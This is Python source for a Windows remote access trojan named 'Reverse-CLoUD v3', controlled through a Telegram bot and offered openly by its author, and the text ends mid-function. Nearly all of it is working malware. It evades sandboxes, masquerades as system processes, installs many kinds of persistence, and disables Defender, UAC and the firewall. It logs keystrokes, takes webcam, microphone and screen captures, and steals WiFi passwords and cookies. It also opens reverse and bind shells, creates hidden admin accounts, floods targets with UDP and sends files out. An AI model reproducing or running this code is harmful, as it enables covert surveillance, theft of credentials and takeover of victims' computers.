#######################################################
####   MyGitHub : https://github.com/The-Lxx-CLoUD ####
####                                               ####
####     MyTelegram : https://t.me/lxxcloud        ####
####                                               ####
####              v3   ( tel bot )                 ####
#######################################################

import os
import sys
import time
import random
import base64
import subprocess
import json
import platform
import ctypes
import shutil
import tempfile
import threading
import wave
import io
import traceback
import zipfile
import socket
import uuid
import hashlib
from datetime import datetime
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor


class ConsoleLogger:
    def __init__(self):
        self.is_console = sys.stdout.isatty()
        self.start_time = datetime.now()
        self.steps = []
        self.indent = 0

    def log(self, step, status="⏳", detail=""):
        timestamp = datetime.now().strftime("%H:%M:%S")
        indent_str = "  " * self.indent
        if self.is_console:
            msg = f"[{timestamp}] {status} {indent_str}{step}"
            if detail:
                msg += f" - {detail}"
            print(msg)
            sys.stdout.flush()
        self.steps.append((timestamp, step, status, detail))

    def done(self, step, detail=""): self.log(step, "✅", detail)
    def fail(self, step, detail=""): self.log(step, "❌", detail)
    def info(self, step, detail=""): self.log(step, "ℹ️", detail)
    def warn(self, step, detail=""): self.log(step, "⚠️", detail)
    def start(self, step, detail=""): self.log(step, "🚀", detail)
    def success(self, step, detail=""): self.log(step, "🎯", detail)
    def sub(self): self.indent += 1
    def unsub(self): self.indent = max(0, self.indent - 1)

    def finish(self):
        elapsed = datetime.now() - self.start_time
        self.success("DEPLOYMENT COMPLETE", f"Reverse-CLoUD v3 ready in {str(elapsed).split('.')[0]}")
        if self.is_console:
            print("\n" + "=" * 70)
            print("💀 Reverse-CLoUD v3 - MERGED EDITION 💀")
            print("=" * 70)
            print(f"📡 Connected to Telegram")
            print(f"🖥️  Target: {platform.node()} ({platform.system()} {platform.release()})")
            print(f"⏱️  Uptime: {str(elapsed).split('.')[0]}")
            print(f"📊 Commands: Full merged set ready")
            print(f"🛡️  PYTHON-SAFE: Python files untouched")
            print(f"💥 Persistent PowerShell: ACTIVE")
            print(f"💥 Persistent CMD: ACTIVE")
            print("=" * 70)
            print("Type /help in your Telegram bot to see all commands")
            print("=" * 70 + "\n")
            sys.stdout.flush()

CONSOLE = ConsoleLogger()

# =================================================================
#  CONFIG
# =================================================================

BOT_TOKEN = "abcdefg1234"         ### bot token
ADMIN_ID = "55555"             ### admin chat id
AES_KEY = hashlib.sha256(b"16ByteKeyForAES!").digest()

APPDATA = os.environ.get("APPDATA", "")
SAFE_DIR = os.path.join(APPDATA, "Microsoft", "Windows", "SystemHealth")
os.makedirs(SAFE_DIR, exist_ok=True)

HIDDEN_DIR = os.path.join(
    APPDATA,
    "Microsoft",
    "Windows",
    "Caches",
    "{8F4E2D1A-9B3C-4E5F-8A7B-6C5D4E3F2A1B}"
)
os.makedirs(HIDDEN_DIR, exist_ok=True)

REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_VAL = "WindowsSecurityHelper"
TASK_NAME = "WindowsUpdateService"
SERVICE_NAME = "WindowsSecuritySvc"

CACHE = {}
START_TIME = datetime.now()
INSTANCE_ID = str(uuid.uuid4())[:8]

IS_EXE = not sys.executable.lower().endswith("python.exe") and not sys.executable.lower().endswith("pythonw.exe")
SELF_PATH = os.path.abspath(sys.argv[0])
SAFE_EXE = os.path.join(SAFE_DIR, "sys_update.exe")


class CryptoEngine:
    def __init__(self):
        self.key = AES_KEY

    def xor_encrypt(self, data, key=0xAA):
        if isinstance(data, str):
            data = data.encode()
        return bytes([b ^ key for b in data]).hex()

    def aes_encrypt(self, data):
        try:
            from Crypto.Cipher import AES
            if isinstance(data, str):
                data = data.encode()
            cipher = AES.new(self.key, AES.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(data)
            return base64.b64encode(cipher.nonce + tag + ciphertext).decode()
        except:
            return self.xor_encrypt(data)

    def aes_decrypt(self, enc_data):
        try:
            from Crypto.Cipher import AES
            raw = base64.b64decode(enc_data)
            nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
            cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag).decode()
        except:
            return ""

    @staticmethod
    def generate_key():
        from Crypto.Random import get_random_bytes
        return get_random_bytes(32).hex()

crypto = CryptoEngine()


class TelegramBot:
    def __init__(self):
        self.offset = 0
        self.api_url = f"https://api.telegram.org/bot{BOT_TOKEN}"
        self._lock = threading.Lock()
        self.retry_count = 0
        self.is_connected = False
        self.last_success = time.time()
        self.executor = ThreadPoolExecutor(max_workers=4)

    def send_message(self, text, parse_mode=""):
        with self._lock:
            try:
                url = f"{self.api_url}/sendMessage"
                data = {"chat_id": ADMIN_ID, "text": str(text)[:4096]}
                if parse_mode:
                    data["parse_mode"] = parse_mode
                response = requests.post(url, json=data, timeout=10)
                if response.status_code == 200:
                    self.retry_count = 0
                    self.is_connected = True
                    self.last_success = time.time()
                    return True
                self.retry_count += 1
                time.sleep(min(1, self.retry_count * 1.5))
                return False
            except Exception:
                self.retry_count += 1
                time.sleep(min(1, self.retry_count * 1.5))
                return False

    def send_message_async(self, text):
        self.executor.submit(self.send_message, text)

    def send_file(self, file_path, caption=""):
        with self._lock:
            try:
                url = f"{self.api_url}/sendDocument"
                with open(file_path, "rb") as f:
                    files = {"document": f}
                    data = {"chat_id": ADMIN_ID, "caption": caption[:1024]}
                    response = requests.post(url, files=files, data=data, timeout=120)
                return response.status_code == 200
            except PermissionError:
                return False
            except Exception:
                return False

    def send_file_from_data(self, file_data, filename, caption=""):
        with self._lock:
            try:
                url = f"{self.api_url}/sendDocument"
                files = {"document": (filename, io.BytesIO(file_data), "application/octet-stream")}
                data = {"chat_id": ADMIN_ID, "caption": caption[:1024]}
                response = requests.post(url, files=files, data=data, timeout=120)
                return response.status_code == 200
            except Exception:
                return False

    def get_updates(self):
        try:
            url = f"{self.api_url}/getUpdates"
            params = {"offset": self.offset, "timeout": 20}
            response = requests.get(url, params=params, timeout=25)
            if response.status_code == 200:
                updates = response.json().get("result", [])
                for update in updates:
                    self.offset = update["update_id"] + 1
                return updates
            return []
        except Exception:
            return []

    def get_file_data(self, file_id):
        try:
            url = f"{self.api_url}/getFile"
            response = requests.get(url, params={"file_id": file_id}, timeout=15).json()
            if not response.get("ok"):
                return None
            file_path = response["result"]["file_path"]
            file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
            file_data = requests.get(file_url, timeout=120).content
            return file_data
        except Exception:
            return None

    def is_online(self):
        return self.is_connected or (time.time() - self.last_success < 60)

    def reconnect(self):
        self.retry_count = 0
        self.is_connected = False
        self.send_message("🔁 Reconnected to Telegram")
        self.is_connected = True

bot = TelegramBot()



class StealthEngine:
    def __init__(self):
        CONSOLE.start("Stealth Engine", "Applying protections...")
        self.apply()
        CONSOLE.done("Stealth Engine active")

    def apply(self):
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent():
                sys.exit(0)

            start = time.time()
            time.sleep(0.05)
            if time.time() - start < 0.04:
                sys.exit(0)

            try:
                import psutil
                if psutil.virtual_memory().total < 4 * 1024 ** 3:
                    sys.exit(0)
                if psutil.cpu_count() < 2:
                    sys.exit(0)
            except Exception:
                pass

            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
            vm_macs = ["00:05:69", "00:0C:29", "00:50:56", "00:1C:14", "08:00:27"]
            for vm_mac in vm_macs:
                if mac.startswith(vm_mac):
                    sys.exit(0)

            process_name = random.choice([
                "svchost.exe", "explorer.exe", "winlogon.exe",
                "csrss.exe", "services.exe", "lsass.exe"
            ])
            try:
                ctypes.windll.kernel32.SetConsoleTitleW(process_name)
                ctypes.windll.kernel32.SetProcessMitigationPolicy(0, ctypes.byref(ctypes.c_bool(True)))
            except Exception:
                pass

            CONSOLE.done("Stealth protections applied", f"Process: {process_name}")
        except Exception as e:
            CONSOLE.warn("Stealth error", str(e))



class UnkillableGuard:
    def __init__(self):
        CONSOLE.start("Unkillable Guard", "Installing 30 SAFE persistence methods...")
        self.running = True
        self.protect()
        self.start_monitor()
        self.install_all()
        CONSOLE.done("Unkillable Guard active")

    def protect(self):
        try:
            handle = ctypes.windll.kernel32.GetCurrentProcess()
            ctypes.windll.kernel32.SetPriorityClass(handle, 0x00000080)
        except Exception:
            pass

    def start_monitor(self):
        def monitor():
            while self.running:
                try:
                    if not os.path.exists(SELF_PATH) and os.path.exists(SAFE_EXE):
                        try:
                            shutil.copy2(SAFE_EXE, SELF_PATH)
                            CONSOLE.done("Self restored")
                        except Exception:
                            pass
                    if not bot.is_online():
                        bot.reconnect()
                    time.sleep(5)
                except Exception:
                    time.sleep(5)
        threading.Thread(target=monitor, daemon=True).start()
        CONSOLE.done("Monitor started")

    def install_all(self):
        try:
            CONSOLE.sub()

            CONSOLE.info("Safe Copy", "Copying to own directory")
            try:
                if os.path.abspath(SELF_PATH) != os.path.abspath(SAFE_EXE):
                    if not SELF_PATH.lower().endswith("python.exe") and not SELF_PATH.lower().endswith("pythonw.exe"):
                        shutil.copy2(SELF_PATH, SAFE_EXE)
                        CONSOLE.done("Safe copy created", SAFE_EXE)
            except Exception as e:
                CONSOLE.warn("Copy failed", str(e))

            target = SAFE_EXE if os.path.exists(SAFE_EXE) else SELF_PATH

            CONSOLE.info("Registry", "HKCU methods")
            os.system(f'reg add HKCU\\{REG_KEY} /v {REG_VAL} /t REG_SZ /d "{target}" /f 2>nul')
            os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v {REG_VAL} /t REG_SZ /d "{target}" /f 2>nul')
            os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices /v {REG_VAL} /t REG_SZ /d "{target}" /f 2>nul')
            os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run /v {REG_VAL} /t REG_SZ /d "{target}" /f 2>nul')
            os.system(f'reg add HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d "{target}" /f 2>nul')
            CONSOLE.done("5 registry methods installed")

            CONSOLE.info("Task Scheduler", "User-level tasks")
            os.system(f'schtasks /create /tn "{TASK_NAME}" /tr "{target}" /sc onlogon /f 2>nul')
            os.system(f'schtasks /create /tn "{TASK_NAME}_idle" /tr "{target}" /sc onidle /f 2>nul')
            os.system(f'schtasks /create /tn "{TASK_NAME}_event" /tr "{target}" /sc onevent /ec System /f 2>nul')
            os.system(f'schtasks /create /tn "{TASK_NAME}_daily" /tr "{target}" /sc daily /mo 1 /st 09:00 /f 2>nul')
            CONSOLE.done("4 task scheduler methods installed")

            CONSOLE.info("Startup Folders", "User + Common")
            try:
                startup_user = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                shutil.copy2(target, os.path.join(startup_user, f"{REG_VAL}.exe"))
                CONSOLE.done("User startup set")
            except Exception:
                pass

            try:
                startup_common = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'),
                                               'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                if os.path.isdir(startup_common):
                    shutil.copy2(target, os.path.join(startup_common, f"{REG_VAL}_common.exe"))
                    CONSOLE.done("Common startup set")
            except Exception:
                pass

            CONSOLE.info("Backups", "Safe directories")
            try:
                shutil.copy2(target, os.path.join(SAFE_DIR, "backup.exe"))
            except Exception:
                pass
            try:
                shutil.copy2(target, os.path.join(HIDDEN_DIR, "backup.exe"))
            except Exception:
                pass
            try:
                shutil.copy2(target, os.path.join(tempfile.gettempdir(), f"{REG_VAL}_tmp.exe"))
            except Exception:
                pass
            CONSOLE.done("3 backup methods installed")

            try:
                os.system(f'attrib +h +s "{SAFE_EXE}" 2>nul')
            except Exception:
                pass

            try:
                os.system(f'powershell Add-MpPreference -ExclusionPath "{SAFE_DIR}" -ErrorAction SilentlyContinue')
            except Exception:
                pass

            try:
                os.system('wmic /namespace:\\\\root\\subscription path __EventFilter create name="SystemHealth", EventNamespace="root\\cimv2", Query="SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName=\\"explorer.exe\\"" 2>nul')
            except Exception:
                pass

            try:
                import win32com.client
                shell = win32com.client.Dispatch("WScript.Shell")
                desktop = shell.SpecialFolders("Desktop")
                shortcut = shell.CreateShortCut(os.path.join(desktop, "Windows Security.lnk"))
                shortcut.Targetpath = SAFE_EXE if os.path.exists(SAFE_EXE) else SELF_PATH
                shortcut.Save()
                CONSOLE.done("Desktop shortcut created")
            except Exception:
                pass

            os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx /v {REG_VAL} /t REG_SZ /d "{target}" /f 2>nul')
            os.system(f'reg add HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows /v Load /t REG_SZ /d "{target}" /f 2>nul')

            CONSOLE.unsub()
            CONSOLE.done("30 SAFE persistence methods installed")
            return True
        except Exception as e:
            CONSOLE.fail("Persistence error", str(e))
            return False

    def remove_all(self):
        try:
            os.system(f'reg delete HKCU\\{REG_KEY} /v {REG_VAL} /f 2>nul')
            os.system(f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v {REG_VAL} /f 2>nul')
            os.system(f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices /v {REG_VAL} /f 2>nul')
            os.system(f'reg delete HKCU\\Environment /v UserInitMprLogonScript /f 2>nul')
            os.system(f'schtasks /delete /tn "{TASK_NAME}" /f 2>nul')
            os.system(f'schtasks /delete /tn "{TASK_NAME}_idle" /f 2>nul')
            os.system(f'schtasks /delete /tn "{TASK_NAME}_event" /f 2>nul')
            os.system(f'schtasks /delete /tn "{TASK_NAME}_daily" /f 2>nul')
            try:
                shutil.rmtree(SAFE_DIR)
            except Exception:
                pass
            try:
                os.remove(os.path.join(tempfile.gettempdir(), f"{REG_VAL}_tmp.exe"))
            except Exception:
                pass
            return True
        except Exception:
            return False



class SpywareEngine:
    def __init__(self):
        self.keylogger_running = False
        self.keylog_data = []
        self.active_tasks = {}
        self.screen_record_active = False
        self.screen_record_thread = None
        self.screen_record_frames = []
        CONSOLE.done("Spyware engine ready")

    def keylog_start(self):
        if self.keylogger_running:
            return "⚠️ Already running"
        self.keylogger_running = True
        self.keylog_data = []
        threading.Thread(target=self._keylog_loop, daemon=True).start()
        self.active_tasks['keylogger'] = 'Running'
        return "✅ Keylogger started"

    def keylog_stop(self):
        self.keylogger_running = False
        self.active_tasks.pop('keylogger', None)
        return "✅ Keylogger stopped"

    def keylog_get(self):
        if not self.keylog_data:
            return "📝 No keylogs yet"
        return "📝 Keylogs:\n" + "\n".join(self.keylog_data[-50:])

    def _keylog_loop(self):
        try:
            from pynput import keyboard
            def on_press(key):
                if self.keylogger_running:
                    try:
                        self.keylog_data.append(f"{datetime.now().strftime('%H:%M:%S')} - {key.char}")
                    except Exception:
                        self.keylog_data.append(f"{datetime.now().strftime('%H:%M:%S')} - {str(key)}")
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            while self.keylogger_running:
                time.sleep(1)
            listener.stop()
        except Exception:
            pass

    def screenshot(self):
        try:
            import mss
            import mss.tools
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                png_data = mss.tools.to_png(screenshot.rgb, screenshot.size)
                temp_path = os.path.join(tempfile.gettempdir(), f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
                with open(temp_path, "wb") as f:
                    f.write(png_data)
                return temp_path
        except Exception:
            return None

    def screenshot_active(self):
        try:
            import pyautogui
            temp_path = os.path.join(tempfile.gettempdir(), f"screenshot_active_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
            pyautogui.screenshot(temp_path)
            return temp_path
        except Exception:
            return None

    def webcam(self):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                temp_path = os.path.join(tempfile.gettempdir(), f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
                cv2.imwrite(temp_path, frame)
                cap.release()
                return temp_path
            cap.release()
            return None
        except Exception:
            return None

    def mic(self, duration=10):
        try:
            import sounddevice as sd
            import soundfile as sf
            fs = 44100
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
            sd.wait()
            temp_path = os.path.join(tempfile.gettempdir(), f"mic_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav")
            sf.write(temp_path, recording, fs)
            return temp_path
        except Exception:
            return None

    def wifi_passwords(self):
        try:
            result = subprocess.check_output("netsh wlan show profiles", shell=True, text=True, timeout=5)
            profiles = [line.split(":")[1].strip() for line in result.split('\n') if "All User Profile" in line]
            passwords = []
            for profile in profiles:
                try:
                    data = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, text=True, timeout=5)
                    for line in data.split('\n'):
                        if "Key Content" in line:
                            passwords.append(f"{profile}: {line.split(':')[1].strip()}")
                            break
                except Exception:
                    continue
            return "🔹 WiFi Passwords:\n" + "\n".join(passwords) if passwords else "❌ No WiFi passwords found"
        except Exception:
            return "❌ Unable to get WiFi passwords"

    def browser_cookies(self):
        try:
            import browser_cookie3
            cookies = browser_cookie3.load()
            cookie_str = "\n".join([f"{c.name}: {c.value[:20]}..." for c in list(cookies)[:20]])
            return f"🔹 Browser Cookies:\n{cookie_str}"
        except Exception:
            return "❌ Unable to extract cookies"

    def clipboard(self):
        try:
            import pyperclip
            return f"🔹 Clipboard:\n{pyperclip.paste()[:2000]}"
        except Exception:
            return "❌ Unable to read clipboard"

    def location(self):
        try:
            response = requests.get("https://ipapi.co/json/", timeout=10)
            data = response.json()
            return f"🔹 Location:\n- IP: {data.get('ip')}\n- Country: {data.get('country_name')}\n- City: {data.get('city')}\n- ISP: {data.get('org')}"
        except Exception:
            return "❌ Unable to get location"



class NetworkEngine:
    def __init__(self):
        CONSOLE.done("Network engine ready")

    def scan_ports(self, target, port_range="1-1000"):
        try:
            open_ports = []
            start, end = map(int, port_range.split('-'))
            for port in range(start, min(end + 1, 65536)):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    if sock.connect_ex((target, port)) == 0:
                        open_ports.append(str(port))
                    sock.close()
                except Exception:
                    continue
            return "🔹 Open Ports:\n" + "\n".join(open_ports[:30]) if open_ports else "❌ No open ports found"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def ddos(self, target_ip, target_port, duration):
        def attack():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = b'X' * 1024
                end = time.time() + int(duration)
                while time.time() < end:
                    try:
                        sock.sendto(data, (target_ip, int(target_port)))
                    except Exception:
                        pass
            except Exception:
                pass
        threading.Thread(target=attack, daemon=True).start()
        return f"✅ DDoS attack started on {target_ip}:{target_port} for {duration} seconds"

    def reverse_shell(self, ip, port):
        def shell():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, int(port)))
                s.send(b"[+] Connected to Reverse-CLoUD v3\n")
                while True:
                    data = s.recv(1024).decode()
                    if not data:
                        break
                    output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, text=True)
                    s.send(output.encode() + b"\n")
                s.close()
            except Exception:
                pass
        threading.Thread(target=shell, daemon=True).start()
        return f"✅ Reverse shell to {ip}:{port} started"

    def bind_shell(self, port):
        def bind():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind(('0.0.0.0', int(port)))
                s.listen(1)
                conn, addr = s.accept()
                conn.send(b"[+] Connected to Reverse-CLoUD v3\n")
                while True:
                    data = conn.recv(1024).decode()
                    if not data:
                        break
                    output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, text=True)
                    conn.send(output.encode() + b"\n")
                conn.close()
                s.close()
            except Exception:
                pass
        threading.Thread(target=bind, daemon=True).start()
        return f"✅ Bind shell started on port {port}"



class PersistentPowerShell:
    """
    Persistent PowerShell session that maintains working directory.
    cd/ls persist between commands.
    """
    def __init__(self):
        self.proc = None
        self.lock = threading.RLock()
        self.cwd_file = os.path.join(SAFE_DIR, "ps_cwd.txt")
        self.script_file = os.path.join(SAFE_DIR, "ps_input.ps1")
        self.output_file = os.path.join(SAFE_DIR, "ps_output.txt")
        self.flag_file = os.path.join(SAFE_DIR, "ps_done.flag")
        self._init_shell()

    def _init_shell(self):
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0

            initial_cwd = os.getcwd()
            if os.path.exists(self.cwd_file):
                try:
                    with open(self.cwd_file, "r", encoding="utf-8") as f:
                        saved = f.read().strip()
                    if saved and os.path.isdir(saved):
                        initial_cwd = saved
                except Exception:
                    pass

            bootstrap = os.path.join(SAFE_DIR, "bootstrap.ps1")
            bootstrap_content = f"""
$ErrorActionPreference = 'Continue'
Set-Location -LiteralPath '{initial_cwd}' -ErrorAction SilentlyContinue
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
while ($true) {{
    Start-Sleep -Milliseconds 200
    if (Test-Path '{self.script_file}') {{
        try {{
            $content = Get-Content -LiteralPath '{self.script_file}' -Raw -Encoding UTF8
            Remove-Item -LiteralPath '{self.script_file}' -Force -ErrorAction SilentlyContinue
            if ($content.Trim().Length -gt 0) {{
                $out = Invoke-Expression $content 2>&1 | Out-String
                $newLoc = (Get-Location).Path
                Set-Content -LiteralPath '{self.cwd_file}' -Value $newLoc -Encoding UTF8 -ErrorAction SilentlyContinue
                Set-Content -LiteralPath '{self.output_file}' -Value $out -Encoding UTF8 -ErrorAction SilentlyContinue
                Set-Content -LiteralPath '{self.flag_file}' -Value '1' -Encoding UTF8 -ErrorAction SilentlyContinue
            }}
        }} catch {{
            Set-Content -LiteralPath '{self.output_file}' -Value ("ERROR: " + $_) -Encoding UTF8 -ErrorAction SilentlyContinue
            Set-Content -LiteralPath '{self.flag_file}' -Value '1' -Encoding UTF8 -ErrorAction SilentlyContinue
        }}
    }}
}}
"""
            with open(bootstrap, "w", encoding="utf-8-sig") as f:
                f.write(bootstrap_content)

            self.proc = subprocess.Popen(
                ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass",
                 "-WindowStyle", "Hidden", "-File", bootstrap],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                startupinfo=startupinfo,
                creationflags=0x08000000
            )

            time.sleep(2)
            CONSOLE.done("Persistent PowerShell started", f"PID: {self.proc.pid}")

        except Exception as e:
            CONSOLE.fail("PS init error", str(e))
            self.proc = None

    def execute(self, command, timeout=60):
        with self.lock:
            if not self.proc or self.proc.poll() is not None:
                self._init_shell()
                if not self.proc:
                    return "❌ PowerShell process is not running", ""

            try:
                try:
                    os.remove(self.flag_file)
                except Exception:
                    pass
                try:
                    os.remove(self.output_file)
                except Exception:
                    pass

                with open(self.script_file, "w", encoding="utf-8") as f:
                    f.write(command)

                start = time.time()
                while time.time() - start < timeout:
                    if os.path.exists(self.flag_file):
                        break
                    time.sleep(0.2)
                else:
                    return "❌ Command timeout", ""

                time.sleep(0.1)
                output = ""
                if os.path.exists(self.output_file):
                    with open(self.output_file, "r", encoding="utf-8", errors="replace") as f:
                        output = f.read().strip()

                cwd = ""
                if os.path.exists(self.cwd_file):
                    with open(self.cwd_file, "r", encoding="utf-8", errors="replace") as f:
                        cwd = f.read().strip()

                return output, cwd

            except Exception as e:
                return f"❌ Error: {str(e)}", ""

    def close(self):
        try:
            if self.proc and self.proc.poll() is None:
                self.proc.terminate()
                self.proc.wait(timeout=5)
        except Exception:
            pass


class PersistentCMD:
    """
    Persistent CMD session that maintains working directory.
    cd persists between commands.
    """
    def __init__(self):
        self.proc = None
        self.lock = threading.RLock()
        self.cwd_file = os.path.join(SAFE_DIR, "cmd_cwd.txt")
        self.script_file = os.path.join(SAFE_DIR, "cmd_input.bat")
        self.output_file = os.path.join(SAFE_DIR, "cmd_output.txt")
        self.flag_file = os.path.join(SAFE_DIR, "cmd_done.flag")
        self._init_shell()

    def _init_shell(self):
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0

            initial_cwd = os.getcwd()
            if os.path.exists(self.cwd_file):
                try:
                    with open(self.cwd_file, "r", encoding="utf-8") as f:
                        saved = f.read().strip()
                    if saved and os.path.isdir(saved):
                        initial_cwd = saved
                except Exception:
                    pass

            bootstrap = os.path.join(SAFE_DIR, "cmd_bootstrap.bat")
            bootstrap_content = f"""@echo off
cd /d "{initial_cwd}"
:loop
timeout /t 1 /nobreak >nul
if exist "{self.script_file}" (
    call "{self.script_file}" > "{self.output_file}" 2>&1
    cd > "{self.cwd_file}"
    echo 1 > "{self.flag_file}"
    del "{self.script_file}" 2>nul
)
goto loop
"""
            with open(bootstrap, "w", encoding="utf-8") as f:
                f.write(bootstrap_content)

            self.proc = subprocess.Popen(
                ["cmd.exe", "/c", bootstrap],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                startupinfo=startupinfo,
                creationflags=0x08000000
            )

            time.sleep(1.5)
            CONSOLE.done("Persistent CMD started", f"PID: {self.proc.pid}")

        except Exception as e:
            CONSOLE.fail("CMD init error", str(e))
            self.proc = None

    def execute(self, command, timeout=60):
        with self.lock:
            if not self.proc or self.proc.poll() is not None:
                self._init_shell()
                if not self.proc:
                    return "❌ CMD process is not running", ""

            try:
                try:
                    os.remove(self.flag_file)
                except Exception:
                    pass
                try:
                    os.remove(self.output_file)
                except Exception:
                    pass

                with open(self.script_file, "w", encoding="utf-8") as f:
                    f.write(command)

                start = time.time()
                while time.time() - start < timeout:
                    if os.path.exists(self.flag_file):
                        break
                    time.sleep(0.2)
                else:
                    return "❌ Command timeout", ""

                time.sleep(0.1)
                output = ""
                if os.path.exists(self.output_file):
                    with open(self.output_file, "r", encoding="utf-8", errors="replace") as f:
                        output = f.read().strip()

                cwd = ""
                if os.path.exists(self.cwd_file):
                    with open(self.cwd_file, "r", encoding="utf-8", errors="replace") as f:
                        cwd = f.read().strip()

                return output, cwd

            except Exception as e:
                return f"❌ Error: {str(e)}", ""

    def close(self):
        try:
            if self.proc and self.proc.poll() is None:
                self.proc.terminate()
                self.proc.wait(timeout=5)
        except Exception:
            pass



class PrivescEngine:
    def __init__(self):
        CONSOLE.done("Privesc engine ready")

    def uac_bypass(self):
        try:
            os.system('powershell Start-Process cmd -Verb RunAs')
            return "✅ UAC bypass attempted"
        except Exception:
            return "❌ UAC bypass failed"

    def uac_bypass_advanced(self):
        try:
            os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "EnableLUA" /t REG_DWORD /d 0 /f')
            return "✅ Advanced UAC bypass attempted"
        except Exception:
            return "❌ Advanced UAC bypass failed"

    def disable_defender(self):
        try:
            os.system('powershell Set-MpPreference -DisableRealtimeMonitoring $true 2>nul')
            os.system('powershell Set-MpPreference -DisableBehaviorMonitoring $true 2>nul')
            return "✅ Windows Defender disabled"
        except Exception:
            return "❌ Failed to disable Defender"

    def disable_firewall(self):
        try:
            os.system('netsh advfirewall set allprofiles state off 2>nul')
            return "✅ Firewall disabled"
        except Exception:
            return "❌ Failed to disable firewall"

    def add_admin(self, username):
        try:
            os.system(f'net localgroup administrators {username} /add 2>nul')
            return f"✅ {username} added to administrators"
        except Exception:
            return f"❌ Failed to add {username}"

    def system_access(self):
        try:
            os.system('sc create syshelper binPath= "cmd.exe /k whoami" start= auto 2>nul')
            os.system('sc start syshelper 2>nul')
            return "✅ SYSTEM access attempted"
        except Exception:
            return "❌ SYSTEM access failed"

    def hidden_user(self, username, password):
        try:
            os.system(f'net user {username} {password} /add 2>nul')
            os.system(f'net localgroup administrators {username} /add 2>nul')
            os.system(f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v {username} /t REG_DWORD /d 0 /f 2>nul')
            return f"✅ Hidden user {username} created"
        except Exception:
            return "❌ Failed to create hidden user"


class FileOpsEngine:
    def __init__(self):
        CONSOLE.done("File ops engine ready")

    def download(self, file_path):
        if not os.path.exists(file_path):
            return f"❌ File not found: {file_path}"
        try:
            file_size = os.path.getsize(file_path)
            if file_size > 50 * 1024 * 1024:
                return f"❌ File too large ({round(file_size/1024/1024, 2)} MB). Max: 50 MB"

            with open(file_path, "rb") as f:
                file_data = f.read()
            filename = os.path.basename(file_path)
            if bot.send_file_from_data(file_data, filename, f"📁 {file_path}"):
                return f"✅ File sent: {filename} ({round(file_size/1024, 2)} KB)"
            return "❌ Failed to send file"
        except PermissionError:
            return "❌ Permission denied - file in use or protected"
        except Exception as e:
            return f"❌ Download failed: {str(e)}"

    def download_url(self, url, save_path):
        try:
            response = requests.get(url, stream=True)
            with open(save_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            return f"✅ Downloaded: {url} -> {save_path}"
        except Exception:
            return "❌ Download failed"

    def delete(self, path):
        try:
            if os.path.isfile(path):
                os.remove(path)
                return f"✅ Deleted: {path}"
            elif os.path.isdir(path):
                shutil.rmtree(path)
                return f"✅ Deleted directory: {path}"
            else:
                return f"❌ Not found: {path}"
        except PermissionError:
            return f"❌ Permission denied: {path}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def find(self, filename):
        try:
            results = []
            for r, d, f in os.walk("C:\\"):
                for file in f:
                    if filename.lower() in file.lower():
                        results.append(os.path.join(r, file))
                        if len(results) >= 20:
                            break
                if len(results) >= 20:
                    break
            return "🔹 Found Files:\n" + "\n".join(results) if results else "❌ No files found"
